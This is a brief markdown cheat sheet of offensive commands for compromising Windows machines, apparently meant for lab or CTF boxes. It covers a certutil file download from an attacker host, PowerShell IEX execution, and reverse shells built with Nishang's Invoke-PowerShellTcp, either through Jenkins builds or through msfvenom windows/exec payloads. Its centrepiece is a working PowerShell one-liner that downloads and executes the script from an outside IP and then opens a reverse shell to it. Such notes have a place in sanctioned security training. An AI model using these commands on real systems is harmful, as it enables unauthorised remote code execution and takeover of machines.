# Commands & Techniques useful in Windows boxes. 

1. **File Transfer**

We can utilize certutil for this

```
certutil -urlcache -f http://<IP Address>/<file name> saved_file

	-- where saved_file is the name of the file you want to save it as
```


2. **Powershell IEX**

IEX stands for Invoke-Expression and is a powerful way of evaluating or invoking any command via powershell. Something like
> **powershell -c iex("whoami")**  

This will essentially execute the whoami command via Powershell. Below are a couple of Good Resources to refresh on this at any time.
- [Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.1)
- [ss64](https://ss64.com/ps/invoke-expression.html)



3. **Reverse Shell through Nishang & IEX**

We can get a reverse shell through Nishang on a Windows system if we have the capacity to execute code on it somehow. 
This can be in scenarios such as
- We have access to some Jenkins server that has code execution on the target machine. Through Jenkins we can then execute the Powershell command laden with IEX to spawn a reverse shell

- We can spawn a Reverse Shell in limited scenarios even through MSFCONSOLE by using Nishang
	- Generate a payload on msfvenom using payload windows/exec and specifying what to execute through CMD=powershell with appropriate IEX
	- The advantage of this method is that the payload is extremely small - which helps in cases of Buffer Overflow that put a restriction on payload size


Nishang Script: Invoke-PowerShellTcp.ps1


***Jenkins Server Example***

```
Inside the Build that allows for Batch Execution of Windows Command you can give a command like

powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.12.172/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.12.172 -Port 1234
```


